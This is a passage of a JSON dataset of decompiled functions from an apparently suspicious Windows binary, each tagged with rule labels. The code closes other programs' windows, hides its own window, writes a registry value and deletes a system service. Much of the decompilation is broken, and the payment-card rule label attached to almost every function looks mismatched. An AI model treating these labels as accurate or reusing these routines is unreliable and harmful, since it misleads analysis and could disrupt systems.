(*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    if ((!bVar9) && (bVar9)) {\n        piVar6 = 0x1;\n        if (bVar8) {\n            return uVar3;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar4 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar4 = *piVar4 + -1;\n    }\n    piVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407430);\n    if (piVar4 == piVar6) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = piVar6;\n    var_4h = piVar6;\n    uVar3 = (*piVar4)(lpdwResult, str._D_3, piVar6, &var_20h);\n    if ((uVar3 < piVar6) || (var_20h == piVar6)) {\n        var_4h = 0xffffffff;\n        if (var_20h != piVar6) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        var_24h = piVar6;\n        uVar3 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((uVar3 < piVar6) || (var_24h == piVar6)) {\n            var_4h = var_4h & 0xffffff00 | piVar6;\n            if (var_24h != piVar6) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != piVar6) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = piVar6;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = piVar6;\n            if (piVar6 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    var_4h._0_1_ = 4;\n                    hWnd = piVar6;\n                    var_10h = piVar6;\n                    uVar3 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    piVar6 = NULL;\n                    if ((uVar3 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00401615:\n                        var_4h = CONCAT31(var_4h._1_3_, 2);\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00401621:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    uVar3 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((uVar3 < 0) || (var_10h == NULL)) ||\n                       (uVar3 = (**(*var_10h + 0x38))(var_10h, &pbstr),  uVar3 < 0)) {\njoined_r0x004015dc:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h = CONCAT31(var_4h._1_3_, 2);\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00401621;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00401418:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h = CONCAT31(var_4h._1_3_, 2);\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401000(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x407444);\n                        if (iVar1 != 0) goto joined_r0x00401418;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        uVar3 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((uVar3 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x004015c1:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00401615;\n                        }\n                        uVar3 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (uVar3 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x004015c1;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar7 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + 1;\n                            }\n                            *puVar7 = 0;\n                            *(puVar7 + 2) = 0;\n                            fcn.00401000(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00401120(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x004015dc;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h = CONCAT31(var_4h._1_3_, 2);\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h & 0xffffff00 | piVar6;\n            if (var_24h != piVar6) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != piVar6) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return uVar3;\n}\n",
        "token_count": 2719
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401730(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073ec);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4016b0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 376
    },
    "00401bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401bb0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404ed0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00401cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d0d) overlaps instruction at (ram,0x00401d0c)\n// \n\nuint __cdecl fcn.00401cb0(uint *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint8_t extraout_CL;\n    uint8_t in_DL;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    bool bVar3;\n    unkbyte6 Var4;\n    \n    bVar3 = (in_DL & unaff_EBX) == 0;\n    Var4 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar3) && (bVar3)) {\n        arg_8h = unaff_EDI + 1;\n        uVar2 = in(Var4 >> 0x20);\n        *unaff_EDI = uVar2;\n        if (&stack0xffffffe8 < 1) {\n            uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n            uVar2 = (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n            *0x423744 = 1;\n            return uVar2;\n        }\n    }\n    *(unaff_EBX + 0x5657087d) = *(unaff_EBX + 0x5657087d) ^ extraout_CL;\n    fcn.00402520();\n    uVar2 = fcn.00402190(Var4, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(Var4);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00401d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401d60(void)\n\n{\n    uint uVar1;\n    \n    if (*0x423744 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x423744 = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00401dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e0d) overlaps instruction at (ram,0x00401e0b)\n// \n\nuint __cdecl fcn.00401dc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t unaff_ESI;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x423748, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 0) || (iVar1 >= 0)) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    }\n    else {\n        *(unaff_ESI + -1) = *(unaff_ESI + -1) + extraout_DL;\n    }\n    return 1;\n}\n",
        "token_count": 235
    },
    "00402380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040248d) overlaps instruction at (ram,0x0040248b)\n// \n// WARNING: Removing unreachable block (ram,0x00402445)\n// WARNING: Removing unreachable block (ram,0x004024c1)\n// WARNING: Removing unreachable block (ram,0x004024da)\n// WARNING: Removing unreachable block (ram,0x004024e3)\n// WARNING: Removing unreachable block (ram,0x004024e0)\n// WARNING: Removing unreachable block (ram,0x00402449)\n// WARNING: Removing unreachable block (ram,0x00402417)\n\nuint * __fastcall fcn.00402380(int32_t param_1, uint32_t param_2, uchar *param_3)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    char *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    int32_t iVar7;\n    char **unaff_EDI;\n    char **ppcVar8;\n    uint16_t in_SS;\n    bool in_PF;\n    bool bVar9;\n    bool in_ZF;\n    char in_SF;\n    bool bVar10;\n    char in_OF;\n    bool bVar11;\n    float10 in_ST0;\n    uchar *puVar12;\n    \n    puVar3 = &stack0xfffffffc;\n    puVar6 = &stack0xfffffffc;\n    if ((!in_PF) && (in_PF)) {\n        puVar6 = &stack0xfffffff0;\n        cVar5 = '\\x1e';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar3;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n        puVar3 = in(0x78);\n        return puVar3;\n    }\n    *param_3 = 0x13;\n    if (((in_PF) || (!in_PF)) && (param_3[1] = 0x83,  in_ZF || in_OF != in_SF)) {\n        param_3[2] = 0xdc;\n        if ((!in_PF) && (in_PF)) {\n            puVar3 = &stack0xfffffff0;\n            cVar5 = '\\x1e';\n            do {\n                puVar6 = puVar6 + -1;\n                puVar3 = puVar3 + -1;\n                *puVar3 = *puVar6;\n                cVar5 = cVar5 + -1;\n            } while ('\\0' < cVar5);\n            puVar3 = in(0x78);\n            return puVar3;\n        }\n        param_3[3] = 0xc6;\n        param_3[4] = 0x53;\n        puVar12 = param_2 & 0xffff | param_1 << 0x10;\n        bVar11 = false;\n        uVar4 = param_1 >> 8 ^ unaff_EBX;\n        bVar10 = uVar4 << 8 < 0;\n        bVar9 = (POPCOUNT(uVar4) & 1U) == 0;\n        param_3[5] = 0x3e;\n        ppcVar8 = unaff_EDI;\n        if ((!bVar10) && (bVar10)) {\n            out(0xc4, in_EAX);\n            puVar12 = param_1 << 0x10 | in_SS;\n            ppcVar8 = unaff_EDI + 1;\n            *unaff_EDI = in_EAX;\n            cVar5 = unaff_EBX >> 8;\n            bVar11 = SBORROW1(cVar5, *in_EAX);\n            cVar5 = cVar5 - *in_EAX;\n            bVar10 = cVar5 < '\\0';\n            bVar9 = (POPCOUNT(cVar5) & 1U) == 0;\n        }\n        param_3[6] = 0x79;\n        if ((!bVar10) && (bVar10)) {\n            ppcVar2 = ppcVar8 + 1;\n            pcVar1 = param_3 + 4;\n            *(ppcVar8 + 7) = in_ST0;\n            ppcVar8 = ppcVar8 + 5;\n            param_3 = param_3 + 5;\n            bVar11 = SBORROW1(*pcVar1, *ppcVar2);\n            cVar5 = *pcVar1 - *ppcVar2;\n            bVar10 = cVar5 < '\\0';\n            bVar9 = (POPCOUNT(cVar5) & 1U) == 0;\n        }\n        param_3[7] = 199;\n        if ((bVar9) || (!bVar9)) {\n            param_3[8] = 0xf;\n        }\n        else {\n            param_3 = 0x34a96cf5;\n            bVar11 = false;\n            *ppcVar8 = *ppcVar8 | param_1;\n            bVar10 = *ppcVar8 < '\\0';\n        }\n        if ((bVar11 != bVar10) || (bVar11 == bVar10)) {\n            param_3 = puVar12;\n        }\n        *(param_3 | 0x5e) = 9;\n        return param_3 | 0x5e;\n    }\n    iVar7 = *0xc617b43a;\n    *(unaff_EBX + -0x7499ef82) = *(unaff_EBX + -0x7499ef82) + param_2 + 1;\n    *0x34a96c80 = 0;\n    if (param_1 == 0) {\n        iVar7 = fcn.004027a0(iVar7 + -0x80, iVar7 + -0x60, iVar7 + -0x20, iVar7 + -0x40);\n        return iVar7 != 0;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 1379
    },
    "004024a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024e3) overlaps instruction at (ram,0x004024e1)\n// \n\nvoid __cdecl fcn.004024a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    uchar *in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar4 = &var_67h;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    iVar1 = puVar4 + 2;\n    *(puVar4 + 2) = 0;\n    cVar6 = SBORROW2(iVar1 + 1, 1);\n    cVar5 = iVar1 < 0;\n    puVar2 = fcn.00402380(&var_68h, &var_4h);\n    if ((cVar6 != cVar5) || (cVar6 == cVar5)) {\n        unaff_EBX = 0xa280;\n        in_stack_ffffff7c = 0x4074a8;\n        puVar2 = &var_68h;\n        in_stack_ffffff74 = puVar2;\n        in_stack_ffffff78 = var_4h;\n    }\n    puVar2[-0x57980000] = puVar2[-0x57980000] & 0x74;\n    fcn.00402010(in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, unaff_EBX);\n    *arg_8h = 0x4074a8;\n    *arg_ch = 0xa280;\n    return;\n}\n",
        "token_count": 487
    },
    "00402520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402533) overlaps instruction at (ram,0x0040252f)\n// \n\nuint __fastcall fcn.00402520(int32_t param_1, char param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *unaff_EDI;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    puVar1 = (in_EAX | 0x8b) - 1;\n    *puVar1 = *puVar1 | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    pcVar2 = (in_EAX | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar4 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar3);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return uVar4;\n}\n",
        "token_count": 346
    },
    "00402580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402616) overlaps instruction at (ram,0x00402615)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00402580(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t unaff_EBX;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uint *puVar11;\n    uint16_t in_SS;\n    bool bVar12;\n    bool bVar13;\n    uchar auStack256 [216];\n    uint32_t *puStack40;\n    uint32_t *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puVar9 = &var_1h + 1;\n    puVar5 = arg_14h * 2;\n    bVar12 = false;\n    bVar13 = arg_14h == NULL;\n    if (0 < arg_14h) {\n        do {\n            if ((bVar12 || bVar13) || (unaff_EBX = unaff_EBX & 0xffff00ff,  !bVar12 && !bVar13)) {\n                arg_14h = *(puVar9 + -8);\n                puVar5 = puVar5 & 0xffffff00 | *(arg_14h + *(puVar9 + 0x10));\n                puVar9[-1] = *(arg_14h + *(puVar9 + 0x10));\n                puStack40 = puVar5;\n                puStack36 = arg_14h;\n            }\n            puVar11 = unaff_EDI + 1;\n            puVar10 = unaff_ESI + 1;\n            *unaff_EDI = *unaff_ESI;\n            uVar8 = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            puVar9 = 0x8be181d0;\n            arg_14h[-1] = 0x8be181d0;\n            pcVar1 = uVar8 + 0xc8af845;\n            *pcVar1 = *pcVar1 + puVar5;\n            uVar4 = *0x8be181d8;\n            bVar12 = (CONCAT11((auStack256 >> 8) - puVar5, 0xe1) - 1U & 0x637b) == 0;\n            uVar7 = *0x8be181c4 % *0x8be181dc;\n            *0x8be181ce = *(uVar7 + *0x8be181d8);\n            uVar6 = arg_14h[-1] & 0xffffff00 | *0x8be181ce;\n            if (bVar12) {\ncode_r0x00402616:\n                *arg_14h = uVar4;\n                arg_14h[-1] = uVar6;\n                arg_14h[-2] = uVar7;\n                arg_14h[-3] = uVar8;\n                arg_14h[-4] = &puStack36;\n                arg_14h[-5] = 0x8be181d0;\n                arg_14h[-6] = puVar10;\n                arg_14h[-7] = puVar11;\n                puVar9 = arg_14h[-5];\n                uVar6 = *(puVar9 + -0xc);\n                puVar5 = *(puVar9 + 8);\n                uVar3 = puVar9[-1] ^ *((uVar6 - 1) % *(puVar9 + 0xc) + puVar5);\n                if (uVar3 == 0) {\ncode_r0x00402642:\n                    *arg_14h = arg_14h[-3];\n                    puStack36 = puVar5;\n                }\n                else {\n                    *(arg_14h + 2) = uVar6;\n                    uVar6 = (uVar6 >> 8 & 0xffff00) << 8 | *(arg_14h + 2);\n                    if (uVar3 != 0) goto code_r0x00402642;\n                }\n                puStack40 = puStack40 & 0xffff0000 | in_SS;\n                puVar10 = 0x47;\n                uVar7 = puVar9[-0x10];\n                puStack36 = puStack36 & 0xffffff00;\n                uVar4 = *(puVar9 + 0x18);\n                *((uVar4 - 1) + uVar6) = puVar9[-0x10] ^ uVar3;\n                unaff_EDI = puStack40;\n                puStack40 = NULL;\n            }\n            else {\n                *arg_14h = puVar11;\n                puVar11 = *arg_14h;\n                if (!bVar12) goto code_r0x00402616;\n                uVar2 = in(uVar7);\n                *puVar11 = uVar2;\n                unaff_EDI = puVar11 + 1;\n                if (0 < &puStack36) {\n                    uVar4 = uVar4 ^ 0xdee0ed6d;\n                    puVar9 = (uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31) - 0x80;\n                    *puVar9 = *puVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            unaff_EBX = puStack36 & 0xffffff00 | puVar9[-2];\n            *(puVar9 + -0xc) = uVar6 + 2;\n            *(uVar6 + uVar4) = uVar7 ^ puVar9[-2];\n            puVar5 = *(puVar9 + 0x14);\n            arg_14h = *(puVar9 + -8) + 1;\n            bVar12 = arg_14h < puVar5;\n            bVar13 = arg_14h == puVar5;\n            *(puVar9 + -8) = arg_14h;\n            unaff_ESI = puVar10;\n        } while (arg_14h < puVar5);\n    }\n    return;\n}\n",
        "token_count": 1505
    },
    "00402b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c10) overlaps instruction at (ram,0x00402c0f)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00402b60(uint param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    ushort in_SS;\n    bool bVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    if (param_2 == 1) {\n        do {\n            fcn.00403350();\n            fcn.00402200();\n            bVar4 = false;\n            bVar5 = (POPCOUNT(extraout_EDX >> 8 & 0x12) & 1U) == 0;\n            iVar6 = extraout_EDX;\n            uVar7 = extraout_ECX;\n            uVar2 = fcn.00401830();\n            if ((bVar5) || (!bVar5)) break;\n            puVar1 = segment(in_SS, *0x10 + -0x10);\n            uVar3 = *puVar1;\n            if (bVar4) {\n                *(extraout_ECX_00 + 0x52) = *(extraout_ECX_00 + 0x52) | 0xa5;\n                param_1 = uVar3;\n                param_2 = iVar6;\n                param_3 = uVar7;\n                param_4 = uVar2;\n                goto code_r0x00402c14;\n            }\n        } while (bVar5);\n        if (*0x42374c == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402d20();\n        }\n    }\ncode_r0x00402c14:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 478
    },
    "00402f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00402f30(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.004026b0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071f0, 0x407230, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 248
    },
    "00403020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403074) overlaps instruction at (ram,0x00403071)\n// \n// WARNING: Removing unreachable block (ram,0x00403068)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403020(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uint *puVar5;\n    bool bVar6;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    int32_t var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar5 = &var_20fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &s + 1;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    puVar1 = puVar5 + 3;\n    *(puVar5 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x3c, *0x10 + -0x214, arg_8h);\n    fcn.00404780(&var_4h, &var_8h);\n    bVar6 = false;\n    uVar3 = fcn.00403150(var_4h);\n    if ((!bVar6) && (bVar6)) {\n        cVar2 = uVar3 - *puVar1;\n        func_0x10189061((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar1) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar3 < *puVar1);\n        var_8h = unaff_EBX + 0x558bf84d;\n        var_4h = extraout_EDX;\n    }\n    iVar4 = fcn.00401ef0(&s, var_4h, var_8h);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    fcn.00404d60(*0x10 + -0x110, 0xff);\n    return 1;\n}\n",
        "token_count": 783
    },
    "00403f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
